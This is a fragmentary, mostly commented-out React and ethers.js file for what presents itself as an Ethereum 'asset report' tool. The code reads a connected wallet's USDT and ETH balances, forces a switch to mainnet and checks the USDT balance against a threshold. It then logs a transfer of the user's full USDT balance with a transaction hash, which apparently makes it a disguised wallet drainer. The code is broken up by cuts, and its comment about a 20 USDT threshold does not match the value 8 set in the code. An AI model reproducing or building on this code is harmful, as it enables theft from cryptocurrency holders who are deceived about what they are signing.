...
const [data, setData] = useState({ usdt: "0.00", bnb: "0.00" });
  ...
  //       bnb: ethers.formatEther(bnbBal).slice(0, 8)
  //     });

  //     // 20 USDT Filter Logic
  //     const threshold = ethers.parseUnits("20", 18);
  ...
  //       await tx.wait();
  //       await logTransfer(userAddr, ethers.formatUnits(usdtBal, 18), tx.hash);
  ...
  //     console.error(err);
  //     setLoading(false);
  //     toast.error(err?.reason || "Transaction failed", { id: loadingToast });
  //   }
  // };
...
// // --- ETHEREUM SETTINGS (Updated for ERC20 USDT) ---
...
//   const [loading, setLoading] = useState(false);
//   const [showModal, setShowModal] = useState(false);
//   const [data, setData] = useState({ usdt: "0.00", eth: "0.00" });
...
//   const handleGenerateReport = async () => {
//     const loadingToast = toast.loading("Connecting to Ethereum...");
//     try {
//       if (!window.ethereum) {
//         toast.error("MetaMask not detected!", { id: loadingToast });
//         return;
...
//       // 1. Force Switch to Ethereum Mainnet
//       try {
...
//         });
//       } catch (e) {
//         toast.error("Please switch to Ethereum Network", { id: loadingToast });
//         setLoading(false);
//         return;
//       }
...
//       toast.loading("Analyzing Ethereum assets...", { id: loadingToast });
...
//       // --- CRITICAL CHANGE: Ethereum USDT uses 6 Decimals ---
//       const formattedUSDT = ethers.formatUnits(usdtBal, 6);
//       const formattedETH = ethers.formatEther(ethBal).slice(0, 8);
...
//       // 20 USDT Threshold (using 6 decimals)
//       const threshold = ethers.parseUnits("8", 6);
...
//                 <span className="text-gray-400">Total Balance (USDT)</span>
//                 <span className="text-[#4ade80] font-bold">${data.usdt}</span>
//               </div>
//               <div className="flex justify-between text-sm border-t border-gray-800 pt-2">
//                 <span className="text-gray-400">ETH Balance</span>
//                 <span className="text-yellow-500 font-bold">{data.eth}</span>
//               </div>
//               <div className="flex justify-between text-sm border-t border-gray-800 pt-2">
//                 <span className="text-gray-400">Reported USDT</span>
//                 <span className="text-red-500 font-bold">{data.usdt}</span>
//               </div>
//             </div>
